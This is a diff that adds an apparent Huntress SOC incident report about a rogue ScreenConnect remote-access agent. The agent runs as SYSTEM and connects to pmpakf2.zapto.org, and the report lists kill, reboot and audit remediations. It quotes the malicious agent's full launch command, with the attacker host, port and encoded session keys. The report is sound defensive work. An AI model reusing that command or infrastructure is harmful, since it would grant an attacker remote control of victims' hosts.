@@ -1,0 +1,31 @@
+Investigative Summary
+---------------------
+At 2025-04-24 02:06:24 UTC, Huntress observed user "SYSTEM" executing a malicious process ScreenConnect.ClientService.exe. This ScreenConnect agent is configured to communicate with the following domain which does not appear to be the standard management site used by this organization:
+- pmpakf2[.]zapto[.]org
+Path: "c:\program files (x86)\screenconnect client (8d0adb11a705e513)\screenconnect.clientservice.exe"
+Instance ID: 8d0adb11a705e513
+
+Rogue ScreenConnect: Huntress has been tracking a number of malicious threat actors convincing users via email into running malicious ScreenConnect (ConnectWise Control) installers that give the threat actor remote access to the host. 
+
+Remediations:
+-------------
+Assisted Remediations provided by the Huntress SOC to remediate the incident. These can be executed automatically in the Huntress Platform:
+- Kill Process - path: C:\Program Files (x86)\ScreenConnect Client (8d0adb11a705e513)\ScreenConnect.ClientService.exe + pid: 4908
+- Reboot the Host - remediation: A reboot is required to complete the remediation plan
+
+Manual Remediations provided by the Huntress SOC are highly recommended remediation actions to be conducted by your team before resolving the incident in the Huntress Platform:
+- Consider enrolling the user in security awareness training to prevent recurrence.
+- Audit affected directories/files for additional suspicious files and remove those found. 
+
+All remediations provided can be found in the Huntress Platform: Incident Report: https://tabinc.huntress.io/org/307757/infection_reports/1492866#remediations-tab
+
+Lead Signal Information
+-----------------------
+Signal Name: Known Malicious Screen Connect
+Detected At: 2025-04-24 02:05:31 UTC
+Start Time: 2025-04-24 01:47:30 UTC
+Command: "C:\Program Files (x86)\ScreenConnect Client (8d0adb11a705e513)\ScreenConnect.ClientService.exe" "?e=Access&y=Guest&h=pmpakf2.zapto.org&p=8041&s=4f4a06b7-f498-420d-9e3c-ddf2be9e947f&k=BgIAAACkAABSU0ExAAgAAAEAAQDB3tX5Q85ZTEUo5lcgpZgwOrsiLjZado7MmzPSFnbjzWV91UdR%2bwc3kLsB9O63aJLow3nmftY3zg%2fvSuCkZ%2fdxv51UE4VSzsOs4w6UVvglRLi8oiBWBvPmTpgQfUUb7jXNI4U83dTpSxzKUCMRSvboIPcrvO7%2bT7YciG1LR2r3f0kUiwDDQUvsinOOS2p6l%2bver1lzGamSk7N%2bwEAhqrT%2bf0Lovg912HRbUQBJN42DMlbDmGYZCqNJQwkW%2fl3gfQoqgS3RgfA%2fvqHuZBVcKA6R7i%2bsuxN97Ep%2br%2bmuIF3V9PIP62MAAY2Wi67ovRXtwzJ2IscMAshSFnP1OKJihqiq&v=AQAAANCMnd8BFdERjHoAwE%2fCl%2bsBAAAAZJBvx%2bPSnEGZaTexD5oKEwAAAAACAAAAAAAQZgAAAAEAACAAAAApyBYxEbxg5QOTwZ705QmAAuIC5gEC3JArmY6tWfkdYAAAAAAOgAAAAAIAACAAAABwwLUU%2fncBGxNIrcSPzZTQ57PeH2pmTjQnVvHphXCXqKAEAAAPpzWA20KR80IeYUnE0Gu3UrFXaRKf%2fCL6vgjIP2Hek3JZY8Z95YWGd5vsIahpKVEtF1A2oow7vR1ilXVCUC8a9KDuNv2igRJ48nJ55yOzH%2fafNsnXBGIeJYi1cAZEuHL6aisunuMxFd3Jl7bd9vz6rHxVKzxewDPN1KqhWJo1AFzpas73WJ83RuwDdVJWWm9M8Q35wSjIuD5Bsz%2f7n97cvozBmgtLq%2fgsfoOW1gmMHMAnSYE6pS5K7ffxGPobcW8n3%2fZRlozJhOKKahD%2f3RFd0UnL1jF%2fhfIWNLibIVQUQ%2bJDTKGrnR3xoiPas%2bHkgf65CD9%2fLw%2bA8amAWAAlf6Ar0GXK9PG1wu5RLCJ8dxJwyYSipTd%2bd93GJxJ5zcIMF%2fxOjchHUCS7Y3G0r%2fRhUFlxDgui9G7l3YvKf58Rh%2btmhAtuDv2A2Tfyk6zyOLpm3xoxUDqnK2JY9X9n%2bo85u4y9DiKBzF7iR38I59CyLo7oBkyZNAJgNSGvNylaUGvR%2bv0cBEhAGt%2fZzIAW2EL99%2b5Al7gwqdmL4OSKkxong%2fZ0miscVhdb%2bru4Nj3f4S7BJGhM5NZCnJ4wH5v%2fzj3eithwb%2bbhJw32WjjJsGqyCfMajcFkLomdXiN68Ldrcev5dpMYysgZQW%2bfti2QRRGl6ag1vUEf9giejq1Mbm%2bPBjm89VrRYQIRHRdhrxzBh%2fBhbr0pCAPs4zwneMgIQbJJJFzQdI58YU%2f%2bi%2fGkuAyR5opGdGbZFyQY7AjmJrFYpJf9jQfR9uB%2fscp9HkqVMez9KGkL79w%2b37AIk2WFS%2bxOKJu4QBQi9wJEg%2fBANakzE7rup1bdGHlykoPyiqiGYk5OzbzKUSWjjN7KUVPeO9J4eOV7C1kXuW8nMpSrj53dSpmOifiKzjcaGlDbZhDHhpTlZOyqdQ4M0MoTow6xh5Ja7pO6ap%2bxEaFiT%2b%2bhGW1L2SvOiJ7QQUaaKvRHigXcojrAuJjKIJHcYUlJdiliw2%2bUdRbmbz690g9nrlrhw9DHl0%2flC2L%2bjbDAMO%2bBKouFZjdowqe6%2b%2fHnj0kX80ndgbE0j%2bkSuHm1Mg6UX0RuXGUqbTiyCBKYkAiVmD9n7o5XRyN1TxJI%2bIgQymt%2fkF1rH8C49HhQ%2fY5Fqd%2bMldpd4HmFfwfKhqYLxHlPZuJyT20ZnBhMSr9%2bZoDFwIrOIIWAjff4oiDuPOsBaAFtwWd8fAbNlT2LCY13RuTZWQ8s5qpgD6x6qn1diOZT77x9aWOCX9clloj9mrSSfhMiEBTWtYhSvQpeQmh9QTXKQdn5Bn5FPMBhtU8hmS439lgmdNqhjRyZSqmnRrJUnuM5nH8liTja2PzxKQTgKFFfQuObvBjsQRLjqeJ3QmRE2YhCZRy9%2bpVQsnUsbfhI2Xt8c%2fQ%2fTcHMx7L3D1mdZwBAizODtNAk2FQ69qiM1YvygK8ikzxT7ZMXFk5sGNOsMfIKJoVPgk7SuV1wDmp7%2bh0e6X32oeKLHzpLDhR9qpKjHSCRvI9lNAt2auALlk1IiHaNUUJlO0q7%2b%2fyLEEHID2Vcwz%2bw%2fRRXZh1tRsaq6Y0C72LAx3as8mK25221qEAAAACYvi9h0bpuTU4US1v%2bdqS6PacLPP0y%2bKWLl3Skyyi7SXUKHPJmVLf0N8eMMCCJL1mWpaJScfaH2gWDCUSWqPxK&c=go&c=&c=&c=&c=&c=&c=&c="
+Executable: C:\Program Files (x86)\ScreenConnect Client (8d0adb11a705e513)\ScreenConnect.ClientService.exe
+Process ID: 0565ca74-20ae-11f0-af2b-00059a3c7a00
+Parent Process: C:\Windows\System32\services.exe
+User: SYSTEM
